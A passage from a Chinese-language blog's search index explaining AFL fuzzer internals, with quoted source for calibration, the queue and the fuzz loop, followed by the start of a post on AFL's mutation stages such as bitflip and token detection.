%s/README.)\n&quot;</span>, doc_path);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fclose(plot_file);</span><br><span class="line">  destroy_queue();</span><br><span class="line">  destroy_extras();</span><br><span class="line">  ck_free(target_path);</span><br><span class="line">  ck_free(sync_id);</span><br><span class="line"></span><br><span class="line">  alloc_report();</span><br><span class="line"></span><br><span class="line">  OKF(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="初始准备"><a href="#初始准备" class="headerlink" title="初始准备"></a>初始准备</h1><h2 id="get-opt"><a href="#get-opt" class="headerlink" title="get opt"></a>get opt</h2><p>第一个<code>while</code>循环去获取获取各种环境的设置，选项参数等等。其实就是 <code>alf-fuzz --help</code>里面的内容就不赘述了。</p><p>紧接着会进行一系列检测操作。</p><h2 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h2><p>设置信号句柄</p><h2 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h2><p>保存命令行参数</p><h2 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h2><p>设置共享内存</p><h2 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h2><p>初始化计算代码覆盖率的表单</p><h2 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h2><p>初始化输出文件夹和fd</p><h2 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h2><p>从输入文件夹中读取所有文件，然后将它们排队进行测试。</p><h2 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h2><p>如果有-t的设置了自己的超时，那么会触发这个函数。</p><h2 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h2><p>识别参数里面有没有<code>@@</code>，如果有就替换为<code>out_dir/.cur_input</code>，如果没有就返回</p><h1 id="dry-run"><a href="#dry-run" class="headerlink" title="dry run"></a>dry run</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_dry_run</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span>* <span class="title">q</span> = <span class="title">queue</span>;</span></span><br><span class="line">  u32 cal_failures = <span class="number">0</span>;</span><br><span class="line">  u8* skip_crashes = getenv(<span class="string">&quot;AFL_SKIP_CRASHES&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">...</span><br><span class="line">    u8* fn = <span class="built_in">strrchr</span>(q-&gt;fname, <span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">    ACTF(<span class="string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line">     </span><br><span class="line">    fd = open(q-&gt;fname, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    use_mem = ck_alloc_nozero(q-&gt;len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, use_mem, q-&gt;len) != q-&gt;len)</span><br><span class="line">      FATAL(<span class="string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    res = calibrate_case(argv, q, use_mem, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    ck_free(use_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == crash_mode || res == FAULT_NOBITS)</span><br><span class="line">      SAYF(cGRA <span class="string">&quot;    len = %u, map size = %u, exec speed = %llu us\n&quot;</span> cRST, </span><br><span class="line">           q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (res) &#123;</span><br><span class="line">           ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;var_behavior) WARNF(<span class="string">&quot;Instrumentation output varies across runs.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    q = q-&gt;next;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  OKF(<span class="string">&quot;All test cases processed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行 input 文件夹下的预先准备的所有 testcase，生成初始化的 queue 和 bitmap。这只对初始输入执行一次，所以叫：dry run。</p><p>其实就是简单跑一遍所有的 testcase，然后看看有没有什么异常，比如：crash，无法触发新的路径，以确保样本和 target 的正确性。</p><p>然后这里面比较关键的函数是 <code>res = calibrate_case(argv, q, use_mem, 0, 1);</code></p><h2 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">static u8 calibrate_case(char** argv, struct queue_entry* q, u8* use_mem, u32 handicap, u8 from_queue) &#123;</span><br><span class="line">  static u8 first_trace[MAP_SIZE];</span><br><span class="line"></span><br><span class="line">  u8  fault &#x3D; 0, new_bits &#x3D; 0, var_detected &#x3D; 0,</span><br><span class="line">      first_run &#x3D; (q-&gt;exec_cksum &#x3D;&#x3D; 0);</span><br><span class="line"></span><br><span class="line">  u64 start_us, stop_us;</span><br><span class="line"></span><br><span class="line">  s32 old_sc &#x3D; stage_cur, old_sm &#x3D; stage_max;</span><br><span class="line">  u32 use_tmout &#x3D; exec_tmout;</span><br><span class="line">  u8* old_sn &#x3D; stage_name;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Be a bit more generous about timeouts when resuming sessions, or when</span><br><span class="line">     trying to calibrate already-added finds. This helps avoid trouble due</span><br><span class="line">     to intermittent latency. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (!from_queue || resuming_fuzz)</span><br><span class="line">    use_tmout &#x3D; MAX(exec_tmout + CAL_TMOUT_ADD,</span><br><span class="line">                    exec_tmout * CAL_TMOUT_PERC &#x2F; 100);</span><br><span class="line"></span><br><span class="line">  q-&gt;cal_failed++;</span><br><span class="line"></span><br><span class="line">  stage_name &#x3D; &quot;calibration&quot;;</span><br><span class="line">  stage_max  &#x3D; fast_cal ? 3 : CAL_CYCLES;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Make sure the forkserver is up before we do anything, and let&#39;s not</span><br><span class="line">     count its spin-up time toward binary calibration. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (dumb_mode !&#x3D; 1 &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">    init_forkserver(argv);</span><br><span class="line"></span><br><span class="line">  if (q-&gt;exec_cksum) memcpy(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  start_us &#x3D; get_cur_time_us();</span><br><span class="line"></span><br><span class="line">  for (stage_cur &#x3D; 0; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 cksum;</span><br><span class="line"></span><br><span class="line">    if (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) show_stats();</span><br><span class="line"></span><br><span class="line">    write_to_testcase(use_mem, q-&gt;len);</span><br><span class="line"></span><br><span class="line">    fault &#x3D; run_target(argv, use_tmout);</span><br><span class="line"></span><br><span class="line">    &#x2F;* stop_soon is set by the handler for Ctrl+C. When it&#39;s pressed,</span><br><span class="line">       we want to bail out quickly. *&#x2F;</span><br><span class="line"></span><br><span class="line">    if (stop_soon || fault !&#x3D; crash_mode) goto abort_calibration;</span><br><span class="line"></span><br><span class="line">    if (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits)) &#123;</span><br><span class="line">      fault &#x3D; FAULT_NOINST;</span><br><span class="line">      goto abort_calibration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">    if (q-&gt;exec_cksum !&#x3D; cksum) &#123;</span><br><span class="line"></span><br><span class="line">      u8 hnb &#x3D; has_new_bits(virgin_bits);</span><br><span class="line">      if (hnb &gt; new_bits) new_bits &#x3D; hnb;</span><br><span class="line"></span><br><span class="line">      if (q-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        u32 i;</span><br><span class="line"></span><br><span class="line">        for (i &#x3D; 0; i &lt; MAP_SIZE; i++) &#123;</span><br><span class="line"></span><br><span class="line">          if (!var_bytes[i] &amp;&amp; first_trace[i] !&#x3D; trace_bits[i]) &#123;</span><br><span class="line"></span><br><span class="line">            var_bytes[i] &#x3D; 1;</span><br><span class="line">            stage_max    &#x3D; CAL_CYCLES_LONG;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var_detected &#x3D; 1;</span><br><span class="line"></span><br><span class="line">      &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        q-&gt;exec_cksum &#x3D; cksum;</span><br><span class="line">        memcpy(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop_us &#x3D; get_cur_time_us();</span><br><span class="line"></span><br><span class="line">  total_cal_us     +&#x3D; stop_us - start_us;</span><br><span class="line">  total_cal_cycles +&#x3D; stage_max;</span><br><span class="line"></span><br><span class="line">  &#x2F;* OK, let&#39;s collect some stats about the performance of this test case.</span><br><span class="line">     This is used for fuzzing air time calculations in calculate_score(). *&#x2F;</span><br><span class="line"></span><br><span class="line">  q-&gt;exec_us     &#x3D; (stop_us - start_us) &#x2F; stage_max;</span><br><span class="line">  q-&gt;bitmap_size &#x3D; count_bytes(trace_bits);</span><br><span class="line">  q-&gt;handicap    &#x3D; handicap;</span><br><span class="line">  q-&gt;cal_failed  &#x3D; 0;</span><br><span class="line"></span><br><span class="line">  total_bitmap_size +&#x3D; q-&gt;bitmap_size;</span><br><span class="line">  total_bitmap_entries++;</span><br><span class="line"></span><br><span class="line">  update_bitmap_score(q);</span><br><span class="line"></span><br><span class="line">  &#x2F;* If this case didn&#39;t result in new output from the instrumentation, tell</span><br><span class="line">     parent. This is a non-critical problem, but something to warn the user</span><br><span class="line">     about. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits) fault &#x3D; FAULT_NOBITS;</span><br><span class="line"></span><br><span class="line">abort_calibration:</span><br><span class="line"></span><br><span class="line">  if (new_bits &#x3D;&#x3D; 2 &amp;&amp; !q-&gt;has_new_cov) &#123;</span><br><span class="line">    q-&gt;has_new_cov &#x3D; 1;</span><br><span class="line">    queued_with_cov++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Mark variable paths. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (var_detected) &#123;</span><br><span class="line"></span><br><span class="line">    var_byte_count &#x3D; count_bytes(var_bytes);</span><br><span class="line"></span><br><span class="line">    if (!q-&gt;var_behavior) &#123;</span><br><span class="line">      mark_as_variable(q);</span><br><span class="line">      queued_variable++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_name &#x3D; old_sn;</span><br><span class="line">  stage_cur  &#x3D; old_sc;</span><br><span class="line">  stage_max  &#x3D; old_sm;</span><br><span class="line"></span><br><span class="line">  if (!first_run) show_stats();</span><br><span class="line"></span><br><span class="line">  return fault;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>calibrate_case</code>首先也会进行一些初始化操作，比较重要的是要检查一下 <code>fork_server</code>是否已经初始化，如果没有则先初始化 <code>fork_server</code>。每个测试样例都会执行3次或8次，而不是简单的执行一次，执行多次并记录tuple的信息。具体取决于是否快速校准</p><p><code>write_to_testcase()</code> ：将测试样例写入文件。如果 use_stdin 被清除了，那么取消旧文件链接并创建一个新文件。否则，prog_in_fd 将被缩短。将 testcase 写入到文件中去。</p><p><code>run_target()</code>：运行程序，见下文。</p><p><code>hash32(trace_bits, MAP_SIZE, HASH_CONST)</code>：计算trace_bits的checksums，即当前tuple的hash值</p><p><code>if...else</code>：如果是第一次运行则记录<code>cksum</code>的值，下次将该次<code>cksum</code>的值和上一次进行比较，如果相同则忽略，如果不同则调用<code>has_new_bits()</code>和我们的总表<em>virgin_bits</em> 对比。</p><p>后续进行一些信息的记录</p><p><code>update_bitmap_score(q)</code> ：对这个测试用例的每一个byte进行排序，用一个top_rate[]来维护它的最佳入口。维护完成之后，我们这个函数在</p><p><strong>总结：</strong><code>calibratecase</code>该函数主要用途是<code>init_forkserver</code>，检查case的可用性，用update_bitmap_score进行初始的byte排序。</p><h2 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver()"></a>init_forkserver()</h2><p><a href="https://0xfocu5.github.io/posts/53fcd800/">记录在上一篇文章了</a></p><p><a href="https://0xfocu5.github.io/posts/53fcd800/">https://0xfocu5.github.io/posts/53fcd800/</a></p><h2 id="run-target"><a href="#run-target" class="headerlink" title="run_target()"></a>run_target()</h2><p><code>memset(trace_bits, 0, MAP_SIZE)</code>：清空共享内存</p><ul><li><p>如果是dumb模式：如果dumb_mode等于1，且no_forkserver，则直接fork出一个子进程，然后让子进程execv去执行target，如果execv执行失败，则向trace_bits写入EXEC_FAIL_SIG</p></li><li><p>否则，就向控制管道写入<code>prev_timed_out</code>的值，命令Fork server开始fork出一个子进程进行fuzz，然后从状态管道读取fork server返回的fork出的子进程的ID到<code>child_pid</code></p></li></ul><p>接下来无论那种模式，如果超过用户所设置的超时时间限制，则杀死程序，并设置child_timed_out为1。</p><p>target执行结束，如果是dumb_mode，target执行结束的状态码将直接保存到status中，如果不是dumb_mode，则从状态管道中读取target执行结束的状态码。然后调用<code>classify_counts((u64 *) trace_bits)</code>去更新代码覆盖率。</p><h2 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits()"></a>has_new_bits()</h2><p>检查当前执行路径是否为表带来了新内容。更新原始位以反映发现。如果唯一更改的是特定元组的命中计数，则返回1;如果有新的元组出现，则返回2。更新映射，因此后续调用将始终返回0。<br>这个函数是在相当大的缓冲区上的每个exec()之后调用的，因此它需要非常快。我们以32位和64位的方式做这件事。因此它需要非常快。我们以32位和64位的方式做这件事。</p><h2 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h2><p>当碰到一条新路径时，我们将看这条路径是否比别的存在路径更加有利。“favorables”的目的是拥有一组最小的路径集（testcase）来触发到目前为止在位图中看到的所有位，并专注于fuzz这些testcase，而牺牲了其余的。这个过程的第一步是bitmap中的每个字节维护一个top_rating[]条目列表。</p><ul><li><p>首先计算出这个case的fav_factor，计算方法是<code>q-&gt;exec_us * q-&gt;len</code>即执行时间和样例大小的乘积，以这两个指标来衡量权重。</p></li><li><p>遍历trace_bits数组，如果该字节的值不为0，则代表这是已经被覆盖到的path</p><p>  然后检查对应于这个path的top_rated是否存在</p><ul><li><p><code>static struct queue_entry *top_rated[MAP_SIZE]; /* Top entries for bitmap bytes */</code></p></li><li><p>如果存在，就比较<code>fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len</code>，即比较执行时间和样例大小的乘积，哪个更小。</p><ul><li>如果<code>top_rated[i]</code>的更小，则代表<code>top_rated[i]</code>的更优，不做任何处理，继续遍历下一个path。</li><li>如果q更小，就将<code>top_rated[i]</code>原先对应的queue entry的tc_ref字段减一，并将其trace_mini字段置为空。</li><li><code>u8 *trace_mini; /* Trace bytes, if kept */</code></li><li><code>u32 tc_ref; /* Trace bytes ref count */</code></li></ul></li><li><p>然后设置<code>top_rated[i]</code>为q，即当前case，然后将其tc_ref的值加一</p></li><li><p>如果<code>q-&gt;trace_mini</code>为空，则将trace_bits经过minimize_bits压缩，然后存到trace_mini字段里</p></li><li><p>设置score_changed为1.</p></li></ul></li></ul><h1 id="fuzz循环"><a href="#fuzz循环" class="headerlink" title="fuzz循环"></a>fuzz循环</h1><h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue()"></a>cull_queue()</h2><p>精简队列。</p><blockquote><p>为了优化模糊工作，AFL使用快速算法定期重新评估队列，该算法选择一个较小的测试用例子集，该子集仍覆盖到目前为止所看到的每个元组，并且其特征使它们对Fuzzing特别有利。该算法通过为每个队列条目分配与其执行延迟和文件大小成正比的分数来工作;然后为每个tuples选择最低得分候选者。<br>cull_queue()遍历top_rated[]中的queue，然后提取出发现新的edge的entry，并标记为favored，使得在下次遍历queue时，这些entry能获得更多执行fuzz的机会。<br>这里本质上采用了贪婪算法，如果top_rated[i]存在，且对应temp_v[]中对应bit位还没抹去，即这一轮选出的queue还没覆盖bit_map[i]对应的边，则取出这个top_rated[i]。抹去temp_v中top_rated[i]能访问到的位。最后将这个top_rated[i]标记为favored,如果这个queue还没fuzzed，pending_favored++.</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li><code>static void show_init_stats(void)</code>在处理输入目录的末尾显示快速统计信息，并添加一系列警告。<br> 一些校准的东西也在这里结束了，还有一些硬编码的常量。也许最终会清理干净。</li><li><code>static u32 find_start_position(void)</code>在恢复时，尝试找到要开始的队列位置。只有在恢复时，以及在可以找到原始fuzzer_stats时，这才有意义。</li><li><code>static void write_stats_file(double bitmap_cvg, double stability, double eps)</code>更新一些状态稳健。</li><li><code>static void save_auto(void)</code>自动更新token，目录/queue/.state/auto<em>extras/auto</em>。</li><li>循环开始前，调用<code>cull_queue()</code> 对queue进行筛选</li></ol><h2 id="while-1"><a href="#while-1" class="headerlink" title="while(1)"></a>while(1)</h2><ol><li>判断queue_cur是否为空，如果是，则表示已经完成对队列的遍历，初始化相关参数，重新开始遍历队列</li><li>找到queue入口的testcase，seek_to = find_start_position()；直接跳到该testcase</li><li>如果一整个队列循环都没新发现，尝试重组策略。</li><li>调用关键函数fuzz_one()对该testcase进行fuzz。fuzz_one()函数参见3.4。</li><li>上面的变异完成后，AFL会对文件队列的下一个进行变异处理。当队列中的全部文件都变异测试后，就完成了一个”cycle”，这个就是AFL状态栏右上角的”cycles done”。而正如cycle的意思所说，整个队列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行deterministic fuzzing了。如果用户不停止AFL，那么seed文件将会一遍遍的变异下去。</li></ol><h2 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one()"></a>fuzz_one()</h2><p><code>static u8 fuzz_one_original(char** argv)</code>从队列中取出当前testcase并模糊。这个函数太长了…如果fuzzed成功，返回0;如果跳过或退出，返回1。<br><strong>步骤：</strong></p><ol><li><p>根据是否有pending_favored和queue_cur的情况按照概率进行跳过；有pending_favored, 对于fuzz过的或者non-favored的以概率99%跳过；无pending_favored，95%跳过fuzzed&amp;non-favored，75%跳过not fuzzed&amp;non-favored，不跳过favored。</p></li><li><p>假如当前项有校准错误，并且校准错误次数小于3次，那么就用calibrate_case进行测试。</p></li><li><p>如果测试用例没有修剪过，那么调用函数<code>trim_case</code>对测试用例进行修剪。</p></li><li><p>修剪完毕之后，使用<code>calculate_score</code>对每个测试用例进行打分。</p></li><li><p>如果该queue已经完成deterministic阶段，则直接跳到havoc阶段</p></li><li><p>deterministic阶段变异4个stage，变异过程中会多次调用函数</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">common_fuzz_stuff</span><br></pre></td></tr></table></figure><p> 保存interesting 的种子：</p><blockquote><p>bitflip，按位翻转，1变为0，0变为1<br>arithmetic，整数加/减算术运算<br>interest，把一些特殊内容替换到原文件中<br>dictionary，把自动生成或用户提供的token替换/插入到原文件中</p></blockquote></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异。</p></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件。</p></li><li><p>该 testcase完成。 The </p></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://rk700.github.io/2017/12/28/afl-internals/">http://rk700.github.io/2017/12/28/afl-internals/</a></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://hicookie.me/2019/09/18/AFL-Learning/">https://hicookie.me/2019/09/18/AFL-Learning/</a></p><p><a href="https://xz.aliyun.com/t/4628#toc-12">https://xz.aliyun.com/t/4628#toc-12</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL 变异原理</title>
      <link href="posts/20f730a9/"/>
      <url>posts/20f730a9/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="http://rk700.github.io/2018/01/04/afl-mutations/">http://rk700.github.io/2018/01/04/afl-mutations/</a></p><h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</p><ul><li>bitflip，按位翻转，1变为0，0变为1</li><li>arithmetic，整数加/减算术运算</li><li>interest，把一些特殊内容替换到原文件中</li><li>dictionary，把自动生成或用户提供的token替换/插入到原文件中</li><li>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异，具体见下文</li><li>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</li></ul><p>其中，前四项bitflip, arithmetic, interest, dictionary是非dumb mode（<code>-d</code>）和主fuzzer（<code>-M</code>）会进行的操作，由于其变异方式没有随机性，所以也称为deterministic fuzzing；havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p><p>以下将对这些变异类型进行具体介绍。</p><h1 id="bitflip"><a href="#bitflip" class="headerlink" title="bitflip"></a>bitflip</h1><p>拿到一个原始文件，打头阵的就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</p><ul><li>bitflip 1/1，每次翻转<strong>1</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</li><li>bitflip 2/1，每次翻转相邻的<strong>2</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</li><li>bitflip 4/1，每次翻转相邻的<strong>4</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</li><li>bitflip 8/8，每次翻转相邻的<strong>8</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个byte做翻转</li><li>bitflip 16/8，每次翻转相邻的<strong>16</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个word做翻转</li><li>bitflip 32/8，每次翻转相邻的<strong>32</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个dword做翻转</li></ul><p>作为精妙构思的fuzzer，AFL不会放过每一个获取文件信息的机会。这一点在bitflip过程中就体现的淋漓尽致。具体地，在上述过程中，AFL巧妙地嵌入了一些对文件格式的启发式判断。</p><h2 id="自动检测token"><a href="#自动检测token" class="headerlink" title="自动检测token"></a>自动检测token</h2><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致(检测程序执行路径的方式可见上篇文章中<a href="https://rk700.github.io/2017/12/28/afl-internals/#%E5%88%86%E6%94%AF%E4%BF%A1%E6%81%AF%E7%9A%84%E5%88%86%E6%9E%90">“分支信息的分析”</a>一节)，那么就把这一段连续的bytes判断是一条token。</p><p>例如，PNG文件中用<code>IHDR</code>作为起始块的标识，那么就会存在类似于以下的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">........IHDR........</span><br></pre></td></tr></table></figure><p>当翻转到字符<code>I</code>的最高位时，因为<code>IHDR</code>被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，<code>IHDR</code>标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：<code>IHDR</code>，并将其记录下来为后面的变异提供备选。</p><p>AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在<code>config.h</code>中通过宏定义了限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 